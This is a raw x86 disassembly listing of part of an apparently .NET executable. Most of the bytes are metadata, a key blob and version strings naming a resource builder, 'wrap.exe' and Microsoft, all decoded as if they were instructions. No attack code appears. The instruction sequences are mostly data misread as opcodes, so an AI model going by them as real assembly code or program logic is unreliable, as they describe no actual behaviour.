  4098a7:	push   es
  4098a8:	adc    DWORD PTR [ecx],ecx
  4098aa:	add    al,0x14
  4098ac:	add    DWORD PTR [eax],eax
  4098ae:	add    BYTE PTR [esp+edx*1],al
  4098b1:	adc    BYTE PTR [eax],al
  4098b3:	add    BYTE PTR [esp+edx*1],al
  4098b6:	add    al,0x0
  4098b8:	add    BYTE PTR [ebx],al
  4098ba:	push   es
  4098bb:	adc    cl,BYTE PTR ds:0x1002003
  4098c1:	add    eax,0x12010120
  4098c6:	or     al,0xf
  4098c8:	and    BYTE PTR [edx],al
  4098ca:	adc    eax,0x12011112
  4098cf:	adc    eax,0x12151912
  4098d4:	adc    DWORD PTR [ecx],eax
  4098d6:	push   cs
  4098d7:	push   es
  4098d8:	and    BYTE PTR [ecx],al
  4098da:	adc    dl,BYTE PTR ds:0x20051d12
  4098e0:	add    DWORD PTR [ecx],eax
  4098e2:	adc    ah,BYTE PTR [ecx]
  4098e4:	pop    es
  4098e5:	and    BYTE PTR [edx],al
  4098e7:	add    DWORD PTR [edx],edx
  4098e9:	and    eax,0x20071d12
  4098ee:	add    al,BYTE PTR [ecx]
  4098f0:	adc    ah,BYTE PTR [ecx]
  4098f2:	adc    dl,BYTE PTR ds:0x2032009
  4098f8:	adc    ah,BYTE PTR ds:0x29121512
  4098fe:	add    al,0x20
  409900:	add    BYTE PTR [edx],dl
  409902:	sub    DWORD PTR ds:0x12010620,ecx
  409908:	and    eax,0x120e2d12
  40990d:	sbb    DWORD PTR [edx],edx
  40990f:	xor    DWORD PTR [esi],ecx
  409911:	or     DWORD PTR [eax],esp
  409913:	add    eax,DWORD PTR [ecx]
  409915:	adc    ah,BYTE PTR ds:0x1d122d12
  40991b:	pop    es
  40991c:	and    BYTE PTR [edx],al
  40991e:	adc    dh,BYTE PTR ds:0x40e3912
  409924:	and    BYTE PTR [ecx],al
  409926:	push   cs
  409927:	push   cs
  409928:	or     BYTE PTR [eax],ah
  40992a:	add    edx,DWORD PTR [edx]
  40992c:	cmp    eax,0xe19120e
  409931:	or     BYTE PTR [eax],ah
  409933:	add    edx,DWORD PTR [edx]
  409935:	inc    ecx
  409936:	push   cs
  409937:	adc    bl,BYTE PTR [ecx]
  409939:	push   cs
  40993a:	add    eax,0x120e0120
  40993f:	sbb    DWORD PTR [edi],ecx
  409941:	and    BYTE PTR [edx],al
  409943:	adc    eax,0x12011112
  409948:	inc    ebp
  409949:	adc    bl,BYTE PTR [ecx]
  40994b:	adc    eax,0xe011112
  409950:	push   es
  409951:	and    BYTE PTR [ecx],al
  409953:	adc    al,BYTE PTR [ebp+0x12]
  409956:	sbb    eax,0x12012006
  40995b:	and    DWORD PTR [edx],edx
  40995d:	or     al,0x5
  40995f:	and    BYTE PTR [ecx],al
  409961:	add    dl,BYTE PTR [edx]
  409963:	inc    ebp
  409964:	or     DWORD PTR [eax],esp
  409966:	add    al,0x1
  409968:	adc    ah,BYTE PTR [ecx]
  40996a:	adc    al,BYTE PTR [ebp+0x2]
  40996d:	add    al,BYTE PTR [eax+eiz*1]
  409970:	add    BYTE PTR [edx],dl
  409972:	xor    eax,0x12012006
  409977:	xor    eax,0x20081912
  40997c:	add    edx,DWORD PTR [edx]
  40997e:	xor    eax,0x19120e0e
  409983:	add    eax,0x31120120
  409988:	push   cs
  409989:	or     ah,BYTE PTR [eax]
  40998b:	add    DWORD PTR ds:0x12014912,edx
  409991:	dec    ebp
  409992:	adc    bl,BYTE PTR [ecx]
  409994:	or     ah,BYTE PTR [eax]
  409996:	add    DWORD PTR ds:0x12014912,edx
  40999c:	push   ecx
  40999d:	adc    bl,BYTE PTR [ecx]
  40999f:	add    eax,0x12010120
  4099a4:	and    eax,0x1022006
  4099a9:	push   cs
  4099aa:	sbb    eax,0x420081c
  4099af:	add    DWORD PTR [edx],edx
  4099b1:	push   ebp
  4099b2:	push   cs
  4099b3:	push   cs
  4099b4:	push   cs
  4099b5:	add    eax,DWORD PTR [esi]
  4099b7:	adc    bl,BYTE PTR [ecx]
  4099b9:	push   es
  4099ba:	push   es
  4099bb:	adc    eax,0xe011112
  4099c0:	add    al,BYTE PTR [esi]
  4099c2:	push   cs
  4099c3:	add    al,BYTE PTR [esi]
  4099c5:	add    al,BYTE PTR ds:0x12010120
  4099cb:	sbb    DWORD PTR [eax+eiz*1],eax
  4099ce:	add    BYTE PTR [edx],dl
  4099d0:	sbb    DWORD PTR [ebx],eax
  4099d2:	and    BYTE PTR [eax],al
  4099d4:	push   cs
  4099d5:	add    al,0x20
  4099d7:	add    DWORD PTR [ecx],eax
  4099d9:	push   cs
  4099da:	add    esp,DWORD PTR [eax]
  4099dc:	add    BYTE PTR [edx],al
  4099de:	add    al,0x20
  4099e0:	add    DWORD PTR [ecx],eax
  4099e2:	add    al,BYTE PTR [eax+eiz*1]
  4099e5:	add    BYTE PTR [edx],dl
  4099e7:	or     eax,0x1012005
  4099ec:	adc    cl,BYTE PTR ds:0x12002804
  4099f2:	sbb    DWORD PTR [ebx],eax
  4099f4:	sub    BYTE PTR [eax],al
  4099f6:	push   cs
  4099f7:	add    ebp,DWORD PTR [eax]
  4099f9:	add    BYTE PTR [edx],al
  4099fb:	add    al,0x28
  4099fd:	add    BYTE PTR [edx],dl
  4099ff:	or     eax,0x59120603
  409a04:	add    eax,DWORD PTR [esi]
  409a06:	adc    bl,BYTE PTR [ebp+0x4]
  409a09:	add    BYTE PTR [eax],al
  409a0b:	adc    bl,BYTE PTR [ecx+0x4]
  409a0e:	add    BYTE PTR [eax],al
  409a10:	adc    bl,BYTE PTR [ebp+0x5]
  409a13:	add    BYTE PTR [ecx],al
  409a15:	add    DWORD PTR [edx],edx
  409a17:	pop    ebp
  409a18:	add    eax,DWORD PTR [eax]
  409a1a:	add    BYTE PTR [esi],cl
  409a1c:	add    al,0x8
  409a1e:	add    BYTE PTR [edx],dl
  409a20:	pop    ecx
  409a21:	add    al,0x8
  409a23:	add    BYTE PTR [edx],dl
  409a25:	pop    ebp
  409a26:	add    ecx,DWORD PTR [eax]
  409a28:	add    BYTE PTR [esi],cl
  409a2a:	add    eax,0x1d080100
  409a2f:	push   cs
  409a30:	add    eax,DWORD PTR [eax]
  409a32:	add    BYTE PTR [ecx],al
  409a34:	adc    eax,DWORD PTR [eax]
  409a36:	or     BYTE PTR [ecx],al
  409a38:	sbb    eax,0x1002100e
  409a3d:	push   cs
  409a3e:	adc    BYTE PTR [esi],cl
  409a40:	adc    BYTE PTR [esi],cl
  409a42:	adc    BYTE PTR [edx],al
  409a44:	adc    BYTE PTR [edx],al
  409a46:	adc    BYTE PTR [esi],cl
  409a48:	add    al,0x1
  409a4a:	add    BYTE PTR [eax],al
  409a4c:	add    BYTE PTR ds:0xe010220,al
  409a52:	push   cs
  409a53:	push   es
  409a54:	and    BYTE PTR [ecx],al
  409a56:	add    DWORD PTR [ecx],edx
  409a58:	sub    BYTE PTR [ebp+0x1012006],0x11
  409a5f:	xor    BYTE PTR [ebp+0x1012004],0x8
  409a66:	and    BYTE PTR [eax+0x2400],0x4
  409a6d:	add    BYTE PTR [eax],0x0
  409a70:	xchg   esp,eax
  409a71:	add    BYTE PTR [eax],al
  409a73:	add    BYTE PTR [esi],al
  409a75:	add    al,BYTE PTR [eax]
  409a77:	add    BYTE PTR [eax],al
  409a79:	and    al,0x0
  409a7b:	add    BYTE PTR [edx+0x53],dl
  409a7e:	inc    ecx
  409a7f:	xor    DWORD PTR [eax],eax
  409a81:	add    al,0x0
  409a83:	add    BYTE PTR [ecx],al
  409a85:	add    BYTE PTR [ecx],al
  409a87:	add    BYTE PTR [ebp+0x2e790fc],dh
  409a8d:	jg     0x409af6
  409a8f:	xchg   DWORD PTR [esi],ebx
  409a91:	ja     0x409acd
  409a93:	(bad)  
  409a94:	fimul  WORD PTR [ecx-0x2be237c8]
  409a9a:	add    bh,BYTE PTR [edx+0x1d20b965]
  409aa0:	pusha  
  409aa1:	pop    ecx
  409aa2:	ds xchg esi,eax
  409aa4:	les    edx,FWORD PTR [edx-0x6377e19b]
  409aaa:	sar    DWORD PTR [edi],0x14
  409aad:	adc    eax,0xac3fb5eb
  409ab2:	adc    DWORD PTR [ecx],esi
  409ab4:	scas   al,BYTE PTR es:[edi]
  409ab5:	or     edx,ebx
  409ab7:	xor    eax,ebp
  409ab9:	out    dx,al
  409aba:	pusha  
  409abb:	and    DWORD PTR [edi+0x2d],esp
  409abe:	xchg   edi,eax
  409abf:	sbb    dl,ch
  409ac1:	xor    DWORD PTR [eax-0x5ff24252],ebp
  409ac7:	pop    es
  409ac8:	das    
  409ac9:	and    eax,0x6fba7dd8
  409ace:	leave  
  409acf:	paddw  mm3,QWORD PTR [ecx-0x72]
  409ad3:	aam    0xda
  409ad5:	xor    eax,0x8c394ce4
  409ada:	inc    ebp
  409adb:	inc    ebx
  409adc:	pop    es
  409add:	call   0x26c4d6c5
  409ae2:	adc    al,0x3d
  409ae4:	scas   al,BYTE PTR es:[edi]
  409ae5:	leave  
  409ae6:	cmc    
  409ae7:	xchg   esi,eax
  409ae8:	sub    DWORD PTR [edi-0x69],0xffffffc8
  409aec:	test   DWORD PTR [edi+0x50],0x645c97e5
  409af3:	loop   0x409b0d
  409af5:	lahf   
  409af6:	inc    ebp
  409af7:	fdivrp st(4),st
  409af9:	imul   ebp,DWORD PTR [edx],0x2b
  409afc:	adc    al,BYTE PTR [edi-0x53]
  409aff:	ret    
  409b00:	gs sub esi,ebp
  409b03:	ret    
  409b04:	or     BYTE PTR ds:0x1505a95d,al
  409b0a:	adc    dl,BYTE PTR [ecx]
  409b0c:	add    DWORD PTR [esi],ecx
  409b0e:	add    eax,0x80120020
  409b13:	mov    ebp,0x8012005
  409b18:	adc    ah,BYTE PTR [ecx]
  409b1a:	push   es
  409b1b:	adc    eax,0x12011112
  409b20:	adc    eax,0x15002009
  409b25:	adc    DWORD PTR [eax+0x1301c1],eax
  409b2b:	pop    es
  409b2c:	adc    eax,0x1c18011
  409b31:	adc    dl,BYTE PTR ds:0x13002004
  409b37:	add    BYTE PTR [esi],al
  409b39:	adc    eax,0x12011112
  409b3e:	inc    ebp
  409b3f:	pop    es
  409b40:	adc    eax,0x1c18011
  409b45:	adc    al,BYTE PTR [ebp+0x30]
  409b48:	pop    es
  409b49:	push   cs
  409b4a:	adc    eax,0x12011112
  409b4f:	adc    eax,0x21125512
  409b54:	adc    dl,BYTE PTR ds:0x1111215
  409b5a:	adc    al,BYTE PTR [ebp+0x12]
  409b5d:	push   ebp
  409b5e:	adc    ah,BYTE PTR [ecx]
  409b60:	adc    al,BYTE PTR [ebp+0x1d]
  409b63:	sbb    al,0x15
  409b65:	adc    DWORD PTR [eax+0x151201c1],eax
  409b6b:	sbb    eax,0x8011151c
  409b70:	rol    DWORD PTR [ecx],0x12
  409b73:	inc    ebp
  409b74:	sbb    eax,0x31c1d1c
  409b79:	and    BYTE PTR [eax],al
  409b7b:	or     BYTE PTR [esi],al
  409b7d:	adc    eax,0x1c18011
  409b82:	push   cs
  409b83:	or     esp,DWORD PTR [eax]
  409b85:	add    ebx,DWORD PTR ds:0x110e1d12
  409b8b:	or     cl,0x11
  409b8e:	or     DWORD PTR [ecx],ecx
  409b90:	adc    eax,0x2cd8012
  409b95:	adc    bl,BYTE PTR ds:0x20051512
  409b9b:	add    al,BYTE PTR [ecx]
  409b9d:	sbb    al,0x18
  409b9f:	adc    dl,BYTE PTR [eax]
  409ba1:	add    al,BYTE PTR [edx]
  409ba3:	sbb    eax,0x1e1d011e
  409ba8:	add    BYTE PTR ds:0x2cd8012,dl
  409bae:	push   ds
  409baf:	add    BYTE PTR [esi],bl
  409bb1:	add    DWORD PTR [esi],eax
  409bb3:	or     al,BYTE PTR [edx]
  409bb5:	adc    bl,BYTE PTR ds:0x20091512
  409bbb:	add    DWORD PTR [ecx],eax
  409bbd:	adc    eax,0x13014912
  409bc2:	add    BYTE PTR [edi],al
  409bc4:	and    BYTE PTR [ecx],al
  409bc6:	sbb    eax,0x9111512
  409bcb:	add    eax,0x13010120
  409bd0:	add    BYTE PTR [esi],bl
  409bd2:	pop    es
  409bd3:	or     DWORD PTR ds:0x12011112,edx
  409bd9:	adc    eax,0x1d121d0e
  409bde:	sbb    eax,0x121d1512
  409be3:	adc    eax,0x11151512
  409be8:	add    cl,0x1
  409beb:	push   cs
  409bec:	sbb    eax,0x7081512
  409bf1:	add    BYTE PTR [edx],al
  409bf3:	add    dl,BYTE PTR [edx]
  409bf5:	adc    eax,0x91512
  409bfa:	add    ecx,DWORD PTR [esi]
  409bfc:	adc    al,BYTE PTR [eax+0x1c1d0edd]
  409c02:	or     BYTE PTR [edi],al
  409c04:	add    edx,DWORD PTR [edx]
  409c06:	adc    eax,0x1c1d1c1d
  409c0b:	add    eax,0x80120020
  409c10:	in     eax,0x7
  409c12:	add    BYTE PTR [ecx],al
  409c14:	adc    bl,BYTE PTR [ecx]
  409c16:	adc    DWORD PTR [eax+0x12006ed],eax
  409c1c:	add    DWORD PTR [edx],edx
  409c1e:	xor    cl,0x8
  409c21:	xor    DWORD PTR [edi+0x36ad5638],edi
  409c27:	dec    esi
  409c28:	xor    eax,0x1012006
  409c2d:	adc    DWORD PTR [ecx+0x20050d],eax
  409c33:	adc    al,BYTE PTR [ecx+0x1200611]
  409c39:	or     BYTE PTR [edx],dl
  409c3b:	or     DWORD PTR [ecx],0x12010704
  409c41:	sub    eax,0x1012006
  409c46:	adc    DWORD PTR [ecx+0x200515],eax
  409c4c:	adc    al,BYTE PTR [ecx+0x200519]
  409c52:	sbb    eax,0x20053912
  409c57:	add    BYTE PTR [edx],dl
  409c59:	sbb    DWORD PTR ds:0x8012005,0x20063512
  409c63:	add    al,BYTE PTR [ecx]
  409c65:	adc    dh,BYTE PTR [ecx]
  409c67:	push   cs
  409c68:	add    al,0x20
  409c6a:	add    DWORD PTR [ecx],eax
  409c6c:	sbb    al,0x8
  409c6e:	and    BYTE PTR [edx],al
  409c70:	add    DWORD PTR [edx],edx
  409c72:	xor    DWORD PTR ds:0x20073112,ebx
  409c78:	add    al,BYTE PTR [ecx]
  409c7a:	adc    bl,BYTE PTR [ecx]
  409c7c:	adc    dh,BYTE PTR [ecx]
  409c7e:	pop    es
  409c7f:	and    BYTE PTR [edx],al
  409c81:	add    DWORD PTR [edx],edx
  409c83:	xor    DWORD PTR [edx],edx
  409c85:	xor    DWORD PTR ds:0x81120020,eax
  409c8b:	cmp    DWORD PTR ds:0x12080120,eax
  409c91:	and    eax,0x120b0717
  409c96:	and    eax,0x29122912
  409c9b:	add    dl,BYTE PTR [edx]
  409c9d:	cmp    DWORD PTR [esi],ecx
  409c9f:	adc    bl,BYTE PTR [ecx]
  409ca1:	adc    al,BYTE PTR [ecx+0x1d]
  409ca4:	adc    bh,BYTE PTR [ecx]
  409ca6:	or     BYTE PTR ds:0x20043112,bl
  409cac:	add    BYTE PTR [edx],dl
  409cae:	cmp    DWORD PTR [edi],eax
  409cb0:	add    BYTE PTR [edx],al
  409cb2:	add    dl,BYTE PTR [edx]
  409cb4:	sbb    DWORD PTR [edx],edx
  409cb6:	sbb    DWORD PTR ds:0x121d0107,eax
  409cbc:	xor    DWORD PTR ds:0x81120020,eax
  409cc2:	inc    ecx
  409cc3:	push   es
  409cc4:	and    BYTE PTR [edx],al
  409cc6:	add    DWORD PTR [edx],edx
  409cc8:	sbb    DWORD PTR [esi],ecx
  409cca:	push   es
  409ccb:	and    BYTE PTR [ecx],al
  409ccd:	or     BYTE PTR [edx],dl
  409ccf:	or     DWORD PTR [ecx+0x4],0x29120107
  409cd6:	push   es
  409cd7:	and    BYTE PTR [ecx],al
  409cd9:	add    DWORD PTR [edx],edx
  409cdb:	adc    DWORD PTR [ecx+0x5],0x81120020
  409ce2:	push   ebp
  409ce3:	add    eax,0x12010120
  409ce8:	xor    DWORD PTR [edx],ecx
  409cea:	and    BYTE PTR [edx],al
  409cec:	add    DWORD PTR [edx],edx
  409cee:	adc    DWORD PTR [ecx+0x1d],0x65d8112
  409cf5:	and    BYTE PTR [ecx],al
  409cf7:	or     BYTE PTR [edx],dl
  409cf9:	and    DWORD PTR [ebp+0x7],0xe010220
  409d00:	sbb    eax,0x7113112
  409d05:	add    eax,0x121d4112
  409d0a:	sbb    DWORD PTR [ebp+0x1d],0x1d5d8112
  409d11:	adc    dh,BYTE PTR [ecx]
  409d13:	sbb    eax,0x107051c
  409d18:	adc    al,BYTE PTR [ecx+0x1200635]
  409d1e:	sbb    eax,0x50e1d12
  409d23:	pop    es
  409d24:	add    cl,BYTE PTR [esi]
  409d26:	sbb    eax,0x320091c
  409d2b:	add    DWORD PTR [edx],edx
  409d2d:	xor    DWORD PTR [esi],ecx
  409d2f:	sbb    eax,0x7073112
  409d34:	add    dl,BYTE PTR [edx]
  409d36:	cmp    eax,0x531121d
  409d3b:	and    BYTE PTR [ecx],al
  409d3d:	or     BYTE PTR [edx],dl
  409d3f:	xor    DWORD PTR [esi],ecx
  409d41:	pop    es
  409d42:	add    al,0x12
  409d44:	inc    ecx
  409d45:	sbb    eax,0x1d5d8112
  409d4a:	adc    dh,BYTE PTR [ecx]
  409d4c:	sbb    eax,0x7043112
  409d51:	add    DWORD PTR ds:0x1215091c,ebx
  409d57:	or     ch,0x2
  409d5a:	adc    bl,BYTE PTR ds:0xa064512
  409d60:	add    dl,BYTE PTR [edx]
  409d62:	sbb    eax,0x20074512
  409d67:	add    DWORD PTR ds:0x9114512,ebx
  409d6d:	adc    eax,0x12150507
  409d72:	adc    DWORD PTR [ecx],eax
  409d74:	adc    al,BYTE PTR [ebp+0xe]
  409d77:	sbb    eax,0x121d1d12
  409d7c:	inc    ebp
  409d7d:	adc    eax,0x1c18011
  409d82:	push   cs
  409d83:	pop    es
  409d84:	add    BYTE PTR [edx],al
  409d86:	add    dl,BYTE PTR [edx]
  409d88:	inc    ebp
  409d89:	adc    al,BYTE PTR [ebp+0x8]
  409d8c:	pop    es
  409d8d:	add    edx,DWORD PTR [edx]
  409d8f:	inc    ebp
  409d90:	sbb    eax,0x41c1d1c
  409d95:	pop    es
  409d96:	add    DWORD PTR [edx],edx
  409d98:	and    DWORD PTR ds:0x121d0020,eax
  409d9e:	sbb    DWORD PTR ds:0x12020120,eax
  409da4:	sbb    DWORD PTR [ebx],ecx
  409da6:	pop    es
  409da7:	add    al,0x1d
  409da9:	adc    bl,BYTE PTR [ecx]
  409dab:	sbb    eax,0x1d1c1d1c
  409db0:	sbb    al,0x6
  409db2:	adc    eax,0x12014912
  409db7:	dec    ebp
  409db8:	or     DWORD PTR [eax],esp
  409dba:	add    BYTE PTR ds:0x1a18112,dl
  409dc0:	adc    eax,DWORD PTR [eax]
  409dc2:	pop    es
  409dc3:	adc    eax,0x1a18112
  409dc8:	adc    cl,BYTE PTR [ebp+0x6]
  409dcb:	adc    eax,0x12014912
  409dd0:	push   ecx
  409dd1:	pop    es
  409dd2:	adc    eax,0x1a18112
  409dd7:	adc    dl,BYTE PTR [ecx+0x8]
  409dda:	and    BYTE PTR [ebx],al
  409ddc:	add    DWORD PTR [edx],edx
  409dde:	sbb    DWORD PTR [esi],ecx
  409de0:	adc    dh,BYTE PTR [ecx]
  409de2:	push   es
  409de3:	and    BYTE PTR [edx],al
  409de5:	add    DWORD PTR [eax],ecx
  409de7:	adc    dh,BYTE PTR ds:0x120b071e
  409ded:	and    eax,0x12022912
  409df2:	sbb    DWORD PTR [edx],eax
  409df4:	adc    cl,BYTE PTR [ebp+0xe]
  409df7:	adc    dl,BYTE PTR [ecx+0xe]
  409dfa:	adc    eax,0x1a18112
  409dff:	adc    cl,BYTE PTR [ebp+0x15]
  409e02:	adc    al,BYTE PTR [ecx+0x511201a1]
  409e08:	or     BYTE PTR [edi],al
  409e0a:	add    dl,BYTE PTR [edx]
  409e0c:	and    DWORD PTR ds:0x931121d,0x12150020
  409e16:	and    DWORD PTR [ecx+0x54d1201],0x81120020
  409e20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e21:	add    eax,DWORD PTR [esi]
  409e23:	adc    cl,BYTE PTR [ebp+0x4]
  409e26:	and    BYTE PTR [eax],al
  409e28:	adc    cl,BYTE PTR [ebp+0x2]
  409e2b:	push   es
  409e2c:	or     BYTE PTR [ebx],al
  409e2e:	and    BYTE PTR [eax],al
  409e30:	sbb    al,0x3
  409e32:	push   es
  409e33:	adc    cl,BYTE PTR [eax]
  409e35:	add    al,0x6
  409e37:	sbb    eax,0x28044d12
  409e3c:	add    BYTE PTR [edx],dl
  409e3e:	dec    ebp
  409e3f:	add    ebp,DWORD PTR [eax]
  409e41:	add    BYTE PTR [ebx+eax*1],bl
  409e44:	add    BYTE PTR [eax],al
  409e46:	or     BYTE PTR [edi+eax*1],al
  409e49:	add    DWORD PTR [edx],edx
  409e4b:	sbb    BYTE PTR [edi],al
  409e4d:	and    BYTE PTR [ecx],al
  409e4f:	sbb    eax,0x9114d12
  409e54:	add    al,0x7
  409e56:	add    al,BYTE PTR [edx]
  409e58:	or     BYTE PTR [ebx],al
  409e5a:	pop    es
  409e5b:	add    DWORD PTR [eax],ecx
  409e5d:	or     DWORD PTR [eax],esp
  409e5f:	add    BYTE PTR ds:0x1a18112,dl
  409e65:	adc    dl,BYTE PTR [ecx+0x3]
  409e68:	push   es
  409e69:	adc    dl,BYTE PTR [ecx+0x4]
  409e6c:	and    BYTE PTR [eax],al
  409e6e:	adc    dl,BYTE PTR [ecx+0x4]
  409e71:	push   es
  409e72:	sbb    eax,0x28045112
  409e77:	add    BYTE PTR [edx],dl
  409e79:	push   ecx
  409e7a:	add    al,0x7
  409e7c:	add    DWORD PTR [edx],edx
  409e7e:	sbb    al,0x7
  409e80:	and    BYTE PTR [ecx],al
  409e82:	sbb    eax,0x9115112
  409e87:	push   es
  409e88:	pop    es
  409e89:	add    DWORD PTR ds:0x55d8112,ebx
  409e8f:	add    BYTE PTR [edx],al
  409e91:	push   cs
  409e92:	push   cs
  409e93:	push   cs
  409e94:	add    al,0x0
  409e96:	add    DWORD PTR [edx],eax
  409e98:	push   cs
  409e99:	push   es
  409e9a:	add    BYTE PTR [ecx],al
  409e9c:	adc    al,BYTE PTR [ecx+0x60ec9]
  409ea2:	add    ecx,DWORD PTR [esi]
  409ea4:	push   cs
  409ea5:	push   cs
  409ea6:	push   cs
  409ea7:	or     ah,BYTE PTR [eax]
  409ea9:	add    eax,DWORD PTR [ecx]
  409eab:	adc    dl,BYTE PTR [ebp+0x12]
  409eae:	or     eax,0xfd58112
  409eb3:	pop    es
  409eb4:	push   es
  409eb5:	adc    al,BYTE PTR [ecx-0x7eedf137]
  409ebb:	rcr    DWORD PTR ds:0x1d1c1d1c,1
  409ec1:	sbb    al,0x40
  409ec3:	add    DWORD PTR [eax],eax
  409ec5:	xor    edx,DWORD PTR [ebx+0x79]
  409ec8:	jae    0x409f3e
  409eca:	gs ins DWORD PTR es:[edi],dx
  409ecc:	cs push edx
  409ece:	gs jae 0x409f40
  409ed1:	jne    0x409f45
  409ed3:	arpl   WORD PTR [ebp+0x73],sp
  409ed6:	cs push esp
  409ed8:	outs   dx,DWORD PTR ds:[esi]
  409ed9:	outs   dx,DWORD PTR ds:[esi]
  409eda:	ins    BYTE PTR es:[edi],dx
  409edb:	jae    0x409f0b
  409edd:	push   ebx
  409ede:	je     0x409f52
  409ee0:	outs   dx,DWORD PTR ds:[esi]
  409ee1:	outs   dx,BYTE PTR ds:[esi]
  409ee2:	ins    BYTE PTR es:[di],dx
  409ee4:	jns    0x409f3a
  409ee6:	jns    0x409f58
  409ee8:	gs fs push edx
  409eeb:	gs jae 0x409f5d
  409eee:	jne    0x409f62
  409ef0:	arpl   WORD PTR [ebp+0x42],sp
  409ef3:	jne    0x409f5e
  409ef5:	ins    BYTE PTR es:[edi],dx
  409ef6:	fs gs jb 0x409f01
  409efa:	xor    al,0x2e
  409efc:	xor    BYTE PTR [esi],ch
  409efe:	xor    BYTE PTR [esi],ch
  409f00:	xor    BYTE PTR [eax],al
  409f02:	add    BYTE PTR ds:0x1c020200,al
  409f08:	sbb    al,0x5
  409f0a:	and    BYTE PTR [eax],al
  409f0c:	adc    al,BYTE PTR [ecx+0x22007e5]
  409f12:	add    DWORD PTR [esi],ecx
  409f14:	adc    al,BYTE PTR [ecx+0x10704e5]
  409f1a:	adc    bl,BYTE PTR [ecx+0x6]
  409f1d:	and    BYTE PTR [edx],al
  409f1f:	push   cs
  409f20:	push   cs
  409f21:	adc    bl,BYTE PTR [ebp+0x6]
  409f24:	and    BYTE PTR [ecx],al
  409f26:	add    DWORD PTR [ecx],edx
  409f28:	sub    ebp,0x2000108
  409f2e:	add    BYTE PTR [eax],al
  409f30:	add    BYTE PTR [eax],al
  409f32:	add    BYTE PTR [esi],al
  409f34:	adc    eax,0x12011112
  409f39:	sbb    DWORD PTR [esi],eax
  409f3b:	add    BYTE PTR [ecx],al
  409f3d:	adc    al,BYTE PTR [ecx+0x20070ee5]
  409f43:	add    bl,BYTE PTR ds:0x219121c
  409f49:	add    eax,0xe010200
  409f4e:	sbb    al,0x7
  409f50:	adc    eax,0x1c18011
  409f55:	adc    bl,BYTE PTR [ecx]
  409f57:	add    al,0x0
  409f59:	add    BYTE PTR [edx],dl
  409f5b:	or     eax,0x1010004
  409f60:	push   cs
  409f61:	daa    
  409f62:	pop    es
  409f63:	adc    DWORD PTR [esi],ecx
  409f65:	push   cs
  409f66:	push   cs
  409f67:	add    al,BYTE PTR [edx]
  409f69:	add    cl,BYTE PTR [esi]
  409f6b:	adc    eax,0x12011112
  409f70:	sbb    DWORD PTR [edx],edx
  409f72:	and    ebp,0x19121912
  409f78:	adc    cl,BYTE PTR [edx+edx*1]
  409f7b:	cmp    ecx,0x19121d08
  409f81:	or     BYTE PTR ds:0x1c18011,dl
  409f87:	adc    bl,BYTE PTR [ecx]
  409f89:	add    eax,0x81120020
  409f8e:	std    
  409f8f:	add    eax,0x82120020
  409f94:	add    DWORD PTR [esi],eax
  409f96:	and    BYTE PTR [ecx],al
  409f98:	adc    al,BYTE PTR [edx+0x20050e05]
  409f9e:	add    BYTE PTR [edx],dl
  409fa0:	add    BYTE PTR ds:0xe030708,0x12
  409fa7:	add    BYTE PTR ds:0x20051c1d,0x1
  409fae:	push   cs
  409faf:	adc    bl,BYTE PTR [ebp+0x4]
  409fb2:	and    BYTE PTR [ecx],al
  409fb4:	add    cl,BYTE PTR [esi]
  409fb6:	add    al,0x20
  409fb8:	add    DWORD PTR [esi],ecx
  409fba:	or     BYTE PTR ds:0xe020200,al
  409fc0:	push   cs
  409fc1:	add    al,0x20
  409fc3:	add    DWORD PTR [eax],ecx
  409fc5:	add    edx,DWORD PTR [ebx]
  409fc7:	pop    es
  409fc8:	or     eax,0xe080e0e
  409fcd:	or     BYTE PTR [esi],cl
  409fcf:	or     BYTE PTR [esi],cl
  409fd1:	sbb    eax,0x1c1d080e
  409fd6:	sbb    eax,0x51c1d1c
  409fdb:	add    DWORD PTR [eax],eax
  409fdd:	add    BYTE PTR [eax],al
  409fdf:	add    BYTE PTR ds:0x10001,al
  409fe5:	add    BYTE PTR [ecx+eax*1],cl
  409fe8:	add    BYTE PTR [edi],al
  409fea:	ja     0x40a04f
  409fec:	popa   
  409fed:	cs gs js 0x40a056
  409ff1:	add    BYTE PTR [eax],al
  409ff3:	sbb    al,BYTE PTR [ecx]
  409ff5:	add    BYTE PTR ds:0x7263694d,dl
  409ffb:	outs   dx,DWORD PTR ds:[esi]
  409ffc:	jae    0x40a06d
  409ffe:	data16 je 0x40a021
  40a001:	inc    ebx
  40a002:	outs   dx,DWORD PTR ds:[esi]
  40a003:	jb     0x40a075
  40a005:	outs   dx,DWORD PTR ds:[esi]
  40a006:	jb     0x40a069
  40a008:	je     0x40a073
  40a00a:	outs   dx,DWORD PTR ds:[esi]
  40a00b:	outs   dx,BYTE PTR ds:[esi]
  40a00c:	add    BYTE PTR [eax],al
  40a00e:	pop    ds
  40a00f:	add    DWORD PTR [eax],eax
  40a011:	sbb    cl,BYTE PTR [ebp+0x69]
  40a014:	arpl   WORD PTR [edx+0x6f],si
  40a017:	jae    0x40a088
  40a019:	data16 je 0x409fde
  40a01c:	scas   al,BYTE PTR es:[edi]
  40a01d:	and    BYTE PTR [esi],ch
  40a01f:	dec    esi
  40a020:	inc    ebp
  40a021:	push   esp
  40a022:	and    BYTE PTR [esi+0x72],al
  40a025:	popa   
  40a026:	ins    DWORD PTR es:[edi],dx
  40a027:	gs ja  0x40a099
  40a02a:	jb     0x40a097
  40a02c:	add    BYTE PTR [eax],al
  40a02e:	xor    al,0x1
  40a030:	add    BYTE PTR [edi],ch
  40a032:	ret    0x20a9
  40a035:	dec    ebp
  40a036:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  40a03d:	je     0x40a05f
  40a03f:	inc    ebx
  40a040:	outs   dx,DWORD PTR ds:[esi]
  40a041:	jb     0x40a0b3
  40a043:	outs   dx,DWORD PTR ds:[esi]
  40a044:	jb     0x40a0a7
  40a046:	je     0x40a0b1
  40a048:	outs   dx,DWORD PTR ds:[esi]
  40a049:	outs   dx,BYTE PTR ds:[esi]
  40a04a:	and    BYTE PTR cs:[eax],ah
  40a04d:	inc    ecx
  40a04e:	ins    BYTE PTR es:[edi],dx
  40a04f:	ins    BYTE PTR es:[edi],dx
  40a050:	and    BYTE PTR [edx+0x69],dh
  40a053:	addr16 push 0x72207374
  40a059:	gs jae 0x40a0c1
  40a05c:	jb     0x40a0d4
  40a05e:	gs fs add BYTE PTR cs:[eax],al
  40a063:	adc    al,0x1
  40a065:	add    BYTE PTR [edi],cl
  40a067:	xor    al,0x2e
  40a069:	xor    BYTE PTR [esi],ch
  40a06b:	xor    esi,DWORD PTR [eax]
